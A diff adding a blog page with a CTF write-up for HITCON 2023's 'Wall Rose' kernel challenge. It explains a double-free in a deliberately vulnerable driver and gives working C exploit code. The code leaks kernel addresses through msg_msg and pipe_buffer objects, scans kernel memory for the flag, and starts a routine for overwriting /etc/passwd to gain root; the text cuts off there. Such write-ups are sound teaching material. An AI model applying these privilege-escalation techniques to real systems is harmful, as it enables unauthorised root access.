@@ -1,0 +1,708 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta name="HandheldFriendly" content="True">
+<meta name="MobileOptimized" content="320">
+<meta name="theme-color" content="#2ecc71">
+
+
+
+
+
+<title>HITCON CTF 2023 Quals - Full Chain - Wall Rose | kileak</title>
+
+
+
+
+
+<meta name="description" content="HITCON CTF 2023 Quals - Full Chain - Wall Rose">
+
+
+<meta name="keywords" content="hitcon, rose">
+
+
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+
+
+
+
+
+
+<link rel="canonical" href="https://kileak.github.io/ctf/2023/hitcon23-rose/">
+<link rel="alternate" type="application/rss+xml" title="kileak" href="https://kileak.github.io/feed.xml" />
+
+
+
+<!-- Google tag (gtag.js) -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-4PGFKKP0QW"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-4PGFKKP0QW');
+</script>
+
+
+<script>base_url = "";</script>
+
+  </head>
+  <body class="">
+
+    <main class="main-container">
+
+        <header class="site-header">
+
+  <div class="container txt-center">
+    <a href="#" class="nav-toogle js-menu-trigger sliding-panel-button">
+      <span></span>
+      <span></span>
+      <span></span>
+    </a>
+
+    <nav class="js-menu sliding-panel-content">
+      <ul>
+        <li><a href="/">home</a></li>
+        <li><a href="https://www.youtube.com/channel/UCi-IXmtQLrJjg5Ji78DqvAg/videos" target="_blank">youtube</a></li>
+        <li><a href="/feed.xml" target="_blank"><i class="icon icon-feed"></i> feed</a></li>
+      </ul>
+    </nav>
+    <div class="js-menu-screen sliding-panel-fade-screen"></div>
+
+    <a href="/" class="author-thumb dot">
+      <img src="/images/author.jpg" alt="Author thumbnail" class="dot">
+    </a>
+
+    <!--
+    <a href="https://www.youtube.com/channel/UCi-IXmtQLrJjg5Ji78DqvAg/videos" target="_blank" class="youtube-thumb dot">
+      <img src="/images/youtube-icon.png" alt="Youtube" class "dot">
+    </a>
+    -->
+
+    
+      <h1 class="post-title">HITCON CTF 2023 Quals - Full Chain - Wall Rose</h1>
+      <p class="post-meta">Sep 10, 2023</p>
+    
+
+  </div>
+
+</header>
+
+
+        <section class="main-content">
+          <article class="post">
+
+  <div class="post-content container">
+    <blockquote>
+  <p>HITCON CTF 2023 Quals - Full Chain - Wall Rose
+<!--break--></p>
+
+  <ul>
+    <li>You have a busybox shell running as user user</li>
+    <li>/home/user/rose.ko is a vulnerable kernel driver</li>
+    <li>Try exploiting /home/user/rose.ko to achieve privilege escalation</li>
+    <li>You may assumed that Busybox, the Linux kernel, and Qemu are not vulnerable.</li>
+  </ul>
+
+  <p>Notes</p>
+
+  <ul>
+    <li>FG-KASLR is enabled</li>
+    <li>Your exploit should be kernel-agnostic. In other words, it should not rely on any kernel offsets</li>
+  </ul>
+
+  <p>Team: Super Guesser</p>
+
+  <p>Attachment: 
+<a href="https://kileak.github.io/assets/hitcon23/rose/wall-rose.tgz">wall-rose.tgz</a> 
+<a href="https://kileak.github.io/assets/hitcon23/rose/pwn.c">pwn.c</a> 
+<a href="https://kileak.github.io/assets/hitcon23/rose/xpl.py">xpl.py</a></p>
+</blockquote>
+
+<p>This challenge was part of the Full Chain series, in which we had to exploit a kernel module to achieve privilege escalation in the kernel part.</p>
+
+<p>The <code class="language-plaintext highlighter-rouge">rose</code> module itself didn’t really do much, except providing a device, which can be opened and closed.</p>
+
+<p>On open, the device would <code class="language-plaintext highlighter-rouge">kmalloc</code> a <code class="language-plaintext highlighter-rouge">0x400</code> chunk in kernel heap, which it would <code class="language-plaintext highlighter-rouge">kfree</code>, when the device gets closed.</p>
+
+<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="p">...</span>
+<span class="k">static</span> <span class="kt">char</span> <span class="o">*</span><span class="n">data</span><span class="p">;</span>
+
+<span class="k">static</span> <span class="kt">int</span> <span class="nf">rose_open</span><span class="p">(</span><span class="k">struct</span> <span class="n">inode</span> <span class="o">*</span><span class="n">inode</span><span class="p">,</span> <span class="k">struct</span> <span class="n">file</span> <span class="o">*</span><span class="n">file</span><span class="p">)</span> <span class="p">{</span>
+    <span class="n">data</span> <span class="o">=</span> <span class="n">kmalloc</span><span class="p">(</span><span class="n">MAX_DATA_HEIGHT</span><span class="p">,</span> <span class="n">GFP_KERNEL</span><span class="p">);</span>
+    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">data</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">printk</span><span class="p">(</span><span class="n">KERN_ERR</span> <span class="s">"Wall Rose: kmalloc error</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+        <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="n">memset</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">MAX_DATA_HEIGHT</span><span class="p">);</span>
+    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="k">static</span> <span class="kt">int</span> <span class="nf">rose_release</span><span class="p">(</span><span class="k">struct</span> <span class="n">inode</span> <span class="o">*</span><span class="n">inode</span><span class="p">,</span> <span class="k">struct</span> <span class="n">file</span> <span class="o">*</span><span class="n">file</span><span class="p">)</span> <span class="p">{</span>
+    <span class="n">kfree</span><span class="p">(</span><span class="n">data</span><span class="p">);</span>
+    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span></code></pre></figure>
+
+<p>The <code class="language-plaintext highlighter-rouge">data</code> pointer is shared between the devices. Thus, we can use that to <code class="language-plaintext highlighter-rouge">free</code> the <code class="language-plaintext highlighter-rouge">data</code> block over and over again, by opening multiple devices (all pointing to the same data block) and whenever we need to free the data block, we can just close one of the devices.</p>
+
+<p>With this, we can free the data block, put another kernel object into that chunk and free it again via another open <code class="language-plaintext highlighter-rouge">rose</code> device.</p>
+
+<p>While using <code class="language-plaintext highlighter-rouge">ttystruct</code> might have been useful here, <code class="language-plaintext highlighter-rouge">/dev/ptmx</code> wasn’t accessable for normal users. So, while searching for useful kernel objects and testing out different approaches, creating and writing to <code class="language-plaintext highlighter-rouge">pipe</code> objects filled up the freed data chunk with <code class="language-plaintext highlighter-rouge">pipe_buffer</code> objects.</p>
+
+<p>But to be able to do something useful with them, we would need some kernel leaks first. I thought of using <code class="language-plaintext highlighter-rouge">msg_msg</code> objects to read the leaks from the freed buffer, but <code class="language-plaintext highlighter-rouge">MSG_COPY</code> didn’t work for me and calling <code class="language-plaintext highlighter-rouge">msgrcv</code> on a message in the chunk, while it’s freed would result in a double free kernel panic.</p>
+
+<p>To get the initial leaks, I did</p>
+
+<ul>
+  <li>open multiple <code class="language-plaintext highlighter-rouge">rose</code> devices</li>
+  <li>free <code class="language-plaintext highlighter-rouge">data</code> buffer</li>
+  <li>send a message with a size, so it would put its <code class="language-plaintext highlighter-rouge">msg_seq</code> buffer in the freed <code class="language-plaintext highlighter-rouge">data</code> buffer</li>
+  <li>free <code class="language-plaintext highlighter-rouge">data</code> buffer again (so <code class="language-plaintext highlighter-rouge">msg_seq</code> chunk is also freed)</li>
+  <li>create a pipe and write to it multiple times to fill up the <code class="language-plaintext highlighter-rouge">data</code> buffer with <code class="language-plaintext highlighter-rouge">pipe_buffer</code> objects</li>
+  <li>free <code class="language-plaintext highlighter-rouge">data</code> buffer again (so the chunk with our <code class="language-plaintext highlighter-rouge">pipe_buffers</code> is freed again)</li>
+  <li>send a message on another message queue with a smaller <code class="language-plaintext highlighter-rouge">msg_seq</code> (but big enough, that it will still get into the freed <code class="language-plaintext highlighter-rouge">0x400</code> chunk) and align it with one of the <code class="language-plaintext highlighter-rouge">pipe_buffers</code></li>
+  <li>read the message from the first message queue (which can read the complete <code class="language-plaintext highlighter-rouge">0x400</code> chunk) and get the leaks from it</li>
+</ul>
+
+<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="kt">int</span> <span class="n">qid</span><span class="p">[</span><span class="mi">2</span><span class="p">];</span>
+<span class="kt">int</span> <span class="n">fds</span><span class="p">[</span><span class="mi">10</span><span class="p">];</span>
+
+<span class="p">...</span>
+
+<span class="kt">void</span> <span class="nf">init_devices</span><span class="p">()</span>
+<span class="p">{</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">"Init devices</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+    <span class="n">memset</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span> <span class="mh">0x41</span><span class="p">,</span> <span class="mh">0x2000</span><span class="p">);</span>
+
+    <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">2</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span>
+        <span class="n">qid</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">msg_open</span><span class="p">();</span>
+
+    <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">10</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span>
+        <span class="n">fds</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">open</span><span class="p">(</span><span class="s">"/dev/rose"</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="kt">void</span> <span class="nf">get_initial_leaks</span><span class="p">()</span>
+<span class="p">{</span>
+    <span class="kt">int</span> <span class="n">pipe_pair</span><span class="p">[</span><span class="mi">2</span><span class="p">];</span>
+
+    <span class="n">printf</span><span class="p">(</span><span class="s">"Free data</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+
+    <span class="n">close</span><span class="p">(</span><span class="n">fds</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
+
+    <span class="n">printf</span><span class="p">(</span><span class="s">"Put msg_seq in freed data</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+
+    <span class="n">msgsend</span><span class="p">(</span><span class="n">qid</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="n">buffer</span><span class="p">,</span> <span class="mh">0xfd0</span> <span class="o">+</span> <span class="mh">0x400</span> <span class="o">-</span> <span class="mh">0x30</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+
+    <span class="n">printf</span><span class="p">(</span><span class="s">"Free msg_seq</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+
+    <span class="n">close</span><span class="p">(</span><span class="n">fds</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
+
+    <span class="n">printf</span><span class="p">(</span><span class="s">"Create pipe</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+
+    <span class="n">pipe</span><span class="p">(</span><span class="n">pipe_pair</span><span class="p">);</span>
+    <span class="n">p</span><span class="p">.</span><span class="n">r</span> <span class="o">=</span> <span class="n">pipe_pair</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
+    <span class="n">p</span><span class="p">.</span><span class="n">w</span> <span class="o">=</span> <span class="n">pipe_pair</span><span class="p">[</span><span class="mi">1</span><span class="p">];</span>
+
+    <span class="n">printf</span><span class="p">(</span><span class="s">"Fill pipe buffers in freed data</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+
+    <span class="n">memset</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span> <span class="mh">0x41</span><span class="p">,</span> <span class="mh">0x100</span><span class="p">);</span>
+    <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mh">0xf1</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span>
+    <span class="p">{</span>
+        <span class="n">write</span><span class="p">(</span><span class="n">p</span><span class="p">.</span><span class="n">w</span><span class="p">,</span> <span class="n">buffer</span><span class="p">,</span> <span class="mh">0x100</span><span class="p">);</span>
+    <span class="p">}</span>
+
+    <span class="n">printf</span><span class="p">(</span><span class="s">"Free pipes</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+
+    <span class="n">close</span><span class="p">(</span><span class="n">fds</span><span class="p">[</span><span class="mi">2</span><span class="p">]);</span>
+
+    <span class="n">printf</span><span class="p">(</span><span class="s">"Put msg_seq in data aligned with pipe buffers</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+
+    <span class="n">msgsend</span><span class="p">(</span><span class="n">qid</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="n">buffer</span><span class="p">,</span> <span class="mh">0xfd0</span> <span class="o">+</span> <span class="mh">0x400</span> <span class="o">-</span> <span class="mh">0x200</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+    <span class="n">msgrcv</span><span class="p">(</span><span class="n">qid</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="n">buffer</span><span class="p">,</span> <span class="mh">0xfd0</span> <span class="o">+</span> <span class="mh">0x400</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+
+    <span class="c1">// Read pipe_buffer data from msg_seq data</span>
+    <span class="k">struct</span> <span class="n">pipe_buffer</span> <span class="o">*</span><span class="n">pbuf</span> <span class="o">=</span> <span class="n">buffer</span> <span class="o">+</span> <span class="mh">0x11d8</span><span class="p">;</span>
+
+    <span class="n">printf</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">"Pipe-&gt;page    : %p</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">pbuf</span><span class="o">-&gt;</span><span class="n">page</span><span class="p">);</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">"Pipe-&gt;offset  : %p</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">pbuf</span><span class="o">-&gt;</span><span class="n">offset</span><span class="p">);</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">"Pipe-&gt;len     : %p</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">pbuf</span><span class="o">-&gt;</span><span class="n">len</span><span class="p">);</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">"Pipe-&gt;ops     : %p</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">pbuf</span><span class="o">-&gt;</span><span class="n">ops</span><span class="p">);</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">"Pipe-&gt;flags   : %p</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">pbuf</span><span class="o">-&gt;</span><span class="n">flags</span><span class="p">);</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">"Pipe-&gt;private : %p</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">pbuf</span><span class="o">-&gt;</span><span class="n">priv</span><span class="p">);</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+
+    <span class="n">pbuf_page</span> <span class="o">=</span> <span class="n">pbuf</span><span class="o">-&gt;</span><span class="n">page</span><span class="p">;</span>
+    <span class="n">pbuf_ops</span> <span class="o">=</span> <span class="n">pbuf</span><span class="o">-&gt;</span><span class="n">ops</span><span class="p">;</span>
+    <span class="n">kernel_base</span> <span class="o">=</span> <span class="n">pbuf_ops</span> <span class="o">-</span> <span class="mh">0x161df80</span><span class="p">;</span>
+    <span class="n">vmemmap_base</span> <span class="o">=</span> <span class="n">pbuf_page</span> <span class="o">&amp;</span> <span class="o">~</span><span class="p">(</span><span class="mh">0xfffffffULL</span><span class="p">);</span>
+    <span class="n">modprobe_addr</span> <span class="o">=</span> <span class="n">pbuf</span><span class="o">-&gt;</span><span class="n">ops</span> <span class="o">+</span> <span class="mh">0x633ea0</span><span class="p">;</span>
+
+    <span class="n">printf</span><span class="p">(</span><span class="s">"Kernel base   : %p</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">kernel_base</span><span class="p">);</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">"VMEMMAP base  : %p</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">vmemmap_base</span><span class="p">);</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">"modprobe_path : %p</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">modprobe_addr</span><span class="p">);</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">argv</span><span class="p">[])</span>
+<span class="p">{</span>
+    <span class="n">init_devices</span><span class="p">();</span>
+    <span class="n">get_initial_leaks</span><span class="p">();</span> 
+<span class="p">}</span></code></pre></figure>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">Init devices
+Free data
+Put msg_seq in freed data
+Free msg_seq
+Create pipe
+Fill pipe buffers in freed data
+Free pipes
+Put msg_seq in data aligned with pipe buffers
+
+Pipe-&gt;page    : 0xffffca3a000a69c0
+Pipe-&gt;offset  : 0
+Pipe-&gt;len     : 0x1000
+Pipe-&gt;ops     : 0xffffffff8901df80
+Pipe-&gt;flags   : 0x10
+Pipe-&gt;private : 0
+
+Kernel base   : 0xffffffff87a00000
+VMEMMAP base  : 0xffffca3a00000000
+modprobe_path : 0xffffffff89651e20</code></pre></figure>
+
+<p>With those leaks at hand, we could now repair the <code class="language-plaintext highlighter-rouge">data</code> chunk by filling it with valid <code class="language-plaintext highlighter-rouge">pipe_buffer</code> objects again, so that we can read and write from them.</p>
+
+<h1 id="getting-the-flag-quick-and-easy-dirty-one">Getting the flag quick and easy (dirty one)</h1>
+
+<p>Having not worked with <code class="language-plaintext highlighter-rouge">pipes</code> by now, I struggled quite some time to get the pipes working in a way to do specific reads. But I was already able to use them to successively read the whole kernel memory.</p>
+
+<p>At that point, I opted for a quick ctf solution: Since the flag file is in kernel memory, why not just read memory until we find the <code class="language-plaintext highlighter-rouge">hitcon</code> string ;)</p>
+
+<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="kt">void</span> <span class="nf">ghetto_find_flag</span><span class="p">()</span>
+<span class="p">{</span>
+    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="o">*</span><span class="n">ptr</span><span class="p">;</span>
+
+    <span class="k">struct</span> <span class="n">pipe_buffer</span> <span class="o">*</span><span class="n">pbuf</span> <span class="o">=</span> <span class="n">buffer</span><span class="p">;</span>
+
+    <span class="k">for</span> <span class="p">(</span><span class="kt">long</span> <span class="n">i</span> <span class="o">=</span> <span class="mh">0xef0000</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mh">0x3bfff000</span><span class="p">;</span> <span class="n">i</span> <span class="o">+=</span> <span class="mh">0x40</span><span class="p">)</span>
+    <span class="p">{</span>
+        <span class="c1">// Rewrite pipe buffer in data</span>
+        <span class="n">memset</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span> <span class="mh">0x0</span><span class="p">,</span> <span class="mh">0x400</span><span class="p">);</span>
+
+        <span class="n">pbuf</span><span class="o">-&gt;</span><span class="n">page</span> <span class="o">=</span> <span class="n">pbuf_page</span> <span class="o">+</span> <span class="n">i</span><span class="p">;</span>
+        <span class="n">pbuf</span><span class="o">-&gt;</span><span class="n">offset</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">;</span>
+        <span class="n">pbuf</span><span class="o">-&gt;</span><span class="n">len</span> <span class="o">=</span> <span class="mh">0x1001</span><span class="p">;</span> <span class="c1">// avoid freeing pipe on read</span>
+        <span class="n">pbuf</span><span class="o">-&gt;</span><span class="n">ops</span> <span class="o">=</span> <span class="n">pbuf_ops</span><span class="p">;</span>
+        <span class="n">pbuf</span><span class="o">-&gt;</span><span class="n">flags</span> <span class="o">=</span> <span class="mh">0x10</span><span class="p">;</span>
+        <span class="n">pbuf</span><span class="o">-&gt;</span><span class="n">priv</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">;</span>
+
+        <span class="n">setxattr</span><span class="p">(</span><span class="s">"/dev/null"</span><span class="p">,</span> <span class="s">"attr"</span><span class="p">,</span> <span class="n">buffer</span><span class="p">,</span> <span class="mh">0x400</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+
+        <span class="n">read</span><span class="p">(</span><span class="n">p</span><span class="p">.</span><span class="n">r</span><span class="p">,</span> <span class="n">buffer</span><span class="p">,</span> <span class="mh">0x1000</span><span class="p">);</span>
+
+        <span class="k">if</span> <span class="p">(</span><span class="n">memstr</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span> <span class="s">"hitcon"</span><span class="p">,</span> <span class="mh">0x1000</span><span class="p">,</span> <span class="mi">6</span><span class="p">))</span>
+        <span class="p">{</span>
+            <span class="n">printf</span><span class="p">(</span><span class="s">"Offset: %p</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">i</span><span class="p">);</span>
+            <span class="n">write</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="n">buffer</span><span class="p">,</span> <span class="mh">0x100</span><span class="p">);</span>
+            <span class="n">dopause</span><span class="p">(</span><span class="s">"found hitcon"</span><span class="p">);</span>
+        <span class="p">}</span>
+    <span class="p">}</span>
+<span class="p">}</span></code></pre></figure>
+
+<p>Might take some time, but will ultimately find the flag (on remote it was pretty quick).</p>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">Init devices
+Free data
+Put msg_seq in freed data
+Free msg_seq
+Create pipe
+Fill pipe buffers in freed data
+Free pipes
+Put msg_seq in data aligned with pipe buffers
+
+Pipe-&gt;page    : 0xfffff00f000a4b40
+Pipe-&gt;offset  : 0
+Pipe-&gt;len     : 0x1000
+Pipe-&gt;ops     : 0xffffffffa9a1df80
+Pipe-&gt;flags   : 0x10
+Pipe-&gt;private : 0
+
+Kernel base   : 0xffffffffa8400000
+VMEMMAP base  : 0xfffff00f00000000
+modprobe_path : 0xffffffffaa051e20
+
+Offset: 0xefc140
+hitcon{The_right_way_of_pronouncing_pipe_is_pee_pay---Inugami_Korone}
+[found hitcon]</code></pre></figure>
+
+<p>Not very elegant, but a flag is a flag, so the challenge was solved for now. But that would not help us, if we would want to do the <code class="language-plaintext highlighter-rouge">umi</code> challenge later on, which required to successfully go through all <code class="language-plaintext highlighter-rouge">Full Chain</code> challenges.</p>
+
+<h1 id="getting-a-proper-root-shell">Getting a proper root shell</h1>
+
+<p>We can use a similar approach like searching for the flag to get more information about kernel addresses.</p>
+
+<p>I did that to find the rose module itself and then read module offsets from it.</p>
+
+<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="kt">void</span> <span class="nf">get_additional_leaks</span><span class="p">()</span>
+<span class="p">{</span>
+    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="o">*</span><span class="n">ptr</span><span class="p">;</span>
+
+    <span class="k">struct</span> <span class="n">pipe_buffer</span> <span class="o">*</span><span class="n">pbuf</span> <span class="o">=</span> <span class="n">buffer</span><span class="p">;</span>
+
+    <span class="k">for</span> <span class="p">(</span><span class="kt">long</span> <span class="n">i</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mh">0x8000000</span><span class="p">;</span> <span class="n">i</span> <span class="o">+=</span> <span class="mh">0x40</span><span class="p">)</span>
+    <span class="p">{</span>
+        <span class="c1">// Rewrite pipe buffer in data</span>
+        <span class="n">memset</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span> <span class="mh">0x0</span><span class="p">,</span> <span class="mh">0x400</span><span class="p">);</span>
+
+        <span class="n">pbuf</span><span class="o">-&gt;</span><span class="n">page</span> <span class="o">=</span> <span class="n">pbuf_page</span> <span class="o">+</span> <span class="n">i</span><span class="p">;</span>
+        <span class="n">pbuf</span><span class="o">-&gt;</span><span class="n">offset</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">;</span>
+        <span class="n">pbuf</span><span class="o">-&gt;</span><span class="n">len</span> <span class="o">=</span> <span class="mh">0x1001</span><span class="p">;</span> <span class="c1">// avoid freeing pipe on read</span>
+        <span class="n">pbuf</span><span class="o">-&gt;</span><span class="n">ops</span> <span class="o">=</span> <span class="n">pbuf_ops</span><span class="p">;</span>
+        <span class="n">pbuf</span><span class="o">-&gt;</span><span class="n">flags</span> <span class="o">=</span> <span class="mh">0x10</span><span class="p">;</span>
+        <span class="n">pbuf</span><span class="o">-&gt;</span><span class="n">priv</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">;</span>
+
+        <span class="n">setxattr</span><span class="p">(</span><span class="s">"/dev/null"</span><span class="p">,</span> <span class="s">"attr"</span><span class="p">,</span> <span class="n">buffer</span><span class="p">,</span> <span class="mh">0x400</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+
+        <span class="n">read</span><span class="p">(</span><span class="n">p</span><span class="p">.</span><span class="n">r</span><span class="p">,</span> <span class="n">buffer</span><span class="p">,</span> <span class="mh">0x1000</span><span class="p">);</span>
+
+        <span class="k">if</span> <span class="p">(</span><span class="n">memstr</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span> <span class="s">"rose"</span><span class="p">,</span> <span class="mh">0x1000</span><span class="p">,</span> <span class="mi">4</span><span class="p">))</span>
+        <span class="p">{</span>
+            <span class="n">moduletext</span> <span class="o">=</span> <span class="n">get_addr</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">);</span>
+            <span class="n">moduleread</span> <span class="o">=</span> <span class="n">get_addr</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">);</span>
+            <span class="n">modulebss</span> <span class="o">=</span> <span class="n">get_addr</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span> <span class="mh">0x50</span><span class="p">);</span>
+            <span class="n">moduleheap</span> <span class="o">=</span> <span class="n">get_addr</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span> <span class="mh">0x540</span><span class="p">);</span>
+
+            <span class="k">if</span> <span class="p">((</span><span class="n">moduleread</span> <span class="o">&amp;</span> <span class="mh">0xfff</span><span class="p">)</span> <span class="o">==</span> <span class="mh">0x36</span><span class="p">)</span>
+            <span class="p">{</span>
+                <span class="n">printf</span><span class="p">(</span><span class="s">"Found moduletext : %p</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">moduletext</span><span class="p">);</span>
+                <span class="n">printf</span><span class="p">(</span><span class="s">"Found moduleread : %p</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">moduleread</span><span class="p">);</span>
+                <span class="n">printf</span><span class="p">(</span><span class="s">"Found modulebss  : %p</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">modulebss</span><span class="p">);</span>
+                <span class="n">printf</span><span class="p">(</span><span class="s">"Found moduleheap : %p</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">moduleheap</span><span class="p">);</span>
+                <span class="n">printf</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+                <span class="k">break</span><span class="p">;</span>
+            <span class="p">}</span>
+        <span class="p">}</span>
+    <span class="p">}</span>
+<span class="p">}</span></code></pre></figure>
+
+<p>But at that point, I still didn’t knew how the <code class="language-plaintext highlighter-rouge">page</code> address from the <code class="language-plaintext highlighter-rouge">pipe_buffer</code> object needed to be filled to do specific read/writes, it was more like randomly reading kernel memory, so I took a break and went on with the <code class="language-plaintext highlighter-rouge">maria</code> challenge.</p>
+
+<p>When <a href="https://github.com/r4j0x00">raj</a> joined later on, we took another look at the challenge, since he had already done some exploits with <code class="language-plaintext highlighter-rouge">pipe_buffer</code> and extended the exploit to scan for the <code class="language-plaintext highlighter-rouge">passwd</code> file instead, overwrote it and then just <code class="language-plaintext highlighter-rouge">su</code>‘d into root, which gave us a root shell.</p>
+
+<p>That also contained the missing pieces for me to get a better idea of <code class="language-plaintext highlighter-rouge">pipe_buffer.page</code>, which I used afterwards to extend the exploit into a more arb read/write style later on (though this was just for practice and to have it written down somewhere for future ctfs).</p>
+
+<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="kt">unsigned</span> <span class="kt">long</span> <span class="nf">find_passwd_off</span><span class="p">()</span>
+<span class="p">{</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">"Search passwd region page offset"</span><span class="p">);</span>
+
+    <span class="kt">uint64_t</span> <span class="n">mpqw</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+    <span class="kt">uint64_t</span> <span class="n">moff</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+
+    <span class="n">page_offset</span> <span class="o">=</span> <span class="n">moduleheap</span> <span class="o">&amp;</span> <span class="o">~</span><span class="p">(</span><span class="mh">0x3fffffff</span><span class="p">);</span>
+
+    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="o">*</span><span class="n">ptr</span><span class="p">;</span>
+
+    <span class="k">while</span> <span class="p">(</span><span class="n">mpqw</span> <span class="o">!=</span> <span class="n">PASSWD_QW</span><span class="p">)</span>
+    <span class="p">{</span>
